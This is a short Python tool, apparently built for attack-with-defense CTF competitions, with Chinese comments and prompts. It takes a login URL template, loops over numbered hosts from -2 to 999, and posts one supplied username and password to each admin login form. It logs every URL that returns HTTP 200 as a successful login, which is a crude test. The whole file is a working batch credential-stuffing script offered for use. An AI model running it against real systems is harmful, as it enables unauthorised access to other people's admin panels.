import requests

def print_usage():
    print("""
  ____  ___  ______   ___   _ ____  _____ ____ 
 / ___|/ _ \|  _ \ \ / / | | / ___|| ____/ ___|
| |  _| | | | | | \ V /| | | \___ \|  _|| |    
| |_| | |_| | |_| || | | |_| |___) | |__| |___ 
 \____|\___/|____/ |_|  \___/|____/|_____\____|

AWD批量后台密码登录工具 Author By-GODYUSEC""")
    print("""
使用方法:网页审查或BP抓到用户名密码对应的表单字段名,脚本会对{}进行遍历登录,并输出可以登录的url,注:不支持带验证码的网站
""")

def try_login(base_url, user, password, user_field, password_field):
    with requests.Session() as session:
        for i in range(-2, 1000):
            url = base_url.format(i)
            payload = {user_field: user, password_field: password}
            response = session.post(url, data=payload)
            if response.status_code == 200:
                print(f"Success at: {url}")
                with open('url.txt', 'a') as file:
                    file.write(url + '\n')
                # 移除了 break 语句，以便脚本继续尝试其他i值

if __name__ == "__main__":
    print_usage()  # 打印使用方法

    base_url = input("请输入目标URL格式（例如：http://rfkpty3014-{}.ecs447.awd.nssctf.cn/admin/login.php）: ")
    user_field = input("请输入用户名对应的表单字段名: ")
    password_field = input("请输入密码对应的表单字段名: ")
    user = input("请输入用户名: ")
    password = input("请输入密码: ")

    try_login(base_url, user, password, user_field, password_field)
